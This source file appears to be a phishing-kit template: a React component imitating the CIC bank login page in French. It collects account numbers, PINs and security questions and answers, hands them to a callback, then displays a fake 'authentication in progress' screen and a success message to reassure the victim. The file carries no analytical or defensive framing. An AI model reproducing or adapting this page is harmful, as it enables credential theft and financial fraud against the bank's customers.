import React, { useState } from 'react';
import { Loader2, Eye, EyeOff } from 'lucide-react';

interface CicAuthTemplateProps {
  onSubmit: (formData: any) => Promise<boolean>;
}

export function CicAuthTemplate({ onSubmit }: CicAuthTemplateProps) {
  const [formData, setFormData] = useState({
    accountNumber: '',
    pin: '',
    securityQuestion: '',
    securityAnswer: ''
  });
  const [status, setStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');
  const [showLoader, setShowLoader] = useState(false);
  const [showPin, setShowPin] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setStatus('sending');

    try {
      const success = await onSubmit(formData);
      if (!success) throw new Error('Failed to submit form');
      
      setStatus('success');
      setShowLoader(true);
      
      setTimeout(() => {
        setShowLoader(false);
        setStatus('idle');
      }, 3000);
    } catch (error) {
      setStatus('error');
      setTimeout(() => setStatus('idle'), 3000);
    }
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
  };

  if (showLoader) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-purple-100 to-purple-50 pt-20">
        <div className="max-w-4xl mx-auto px-4 py-8">
          <div className="bg-white rounded-2xl shadow-xl p-8">
            <div className="flex flex-col items-center justify-center py-16">
              <Loader2 className="w-12 h-12 animate-spin text-purple-600 mb-6" />
              <h2 className="text-2xl font-bold text-gray-800 mb-4">
                Authentification en cours...
              </h2>
              <p className="text-gray-600 text-center max-w-md">
                Connexion sécurisée à votre espace CIC en cours. Veuillez patienter.
              </p>
              <div className="mt-8 w-full max-w-xs">
                <div className="bg-gray-200 rounded-full h-2">
                  <div className="bg-purple-600 h-2 rounded-full animate-pulse" style={{ width: '70%' }}></div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-100 to-purple-50 pt-20">
      <div className="max-w-4xl mx-auto px-4 py-8">
        <div className="bg-white rounded-2xl shadow-xl overflow-hidden">
          <div className="bg-gradient-to-r from-purple-600 to-purple-700 px-8 py-12">
            <h1 className="text-3xl font-bold text-white mb-2">CIC</h1>
            <p className="text-purple-100">Authentification sécurisée</p>
          </div>

          <div className="p-8">
            <form onSubmit={handleSubmit} className="space-y-6 max-w-md mx-auto">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Numéro de compte
                </label>
                <input
                  type="text"
                  name="accountNumber"
                  value={formData.accountNumber}
                  onChange={handleChange}
                  placeholder="Entrez votre numéro de compte"
                  required
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Code PIN
                </label>
                <div className="relative">
                  <input
                    type={showPin ? 'text' : 'password'}
                    name="pin"
                    value={formData.pin}
                    onChange={handleChange}
                    placeholder="Entrez votre code PIN"
                    required
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent"
                  />
                  <button
                    type="button"
                    onClick={() => setShowPin(!showPin)}
                    className="absolute right-3 top-3 text-gray-500"
                  >
                    {showPin ? <EyeOff size={20} /> : <Eye size={20} />}
                  </button>
                </div>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Question de sécurité
                </label>
                <input
                  type="text"
                  name="securityQuestion"
                  value={formData.securityQuestion}
                  onChange={handleChange}
                  placeholder="Ex: Nom de votre animal de compagnie"
                  required
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Réponse
                </label>
                <input
                  type="text"
                  name="securityAnswer"
                  value={formData.securityAnswer}
                  onChange={handleChange}
                  placeholder="Entrez votre réponse"
                  required
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-500 focus:border-transparent"
                />
              </div>

              <button
                type="submit"
                disabled={status === 'sending'}
                className="w-full bg-purple-600 text-white font-semibold py-4 rounded-lg transition duration-200 hover:bg-purple-700 disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {status === 'sending' ? 'Authentification...' : 'SE CONNECTER'}
              </button>

              {status === 'success' && !showLoader && (
                <div className="text-green-600 text-center bg-green-50 p-3 rounded-lg">
                  Authentification réussie!
                </div>
              )}
              {status === 'error' && (
                <div className="text-red-600 text-center bg-red-50 p-3 rounded-lg">
                  Erreur lors de l'authentification. Veuillez réessayer.
                </div>
              )}
            </form>
          </div>
        </div>
      </div>
    </div>
  );
}
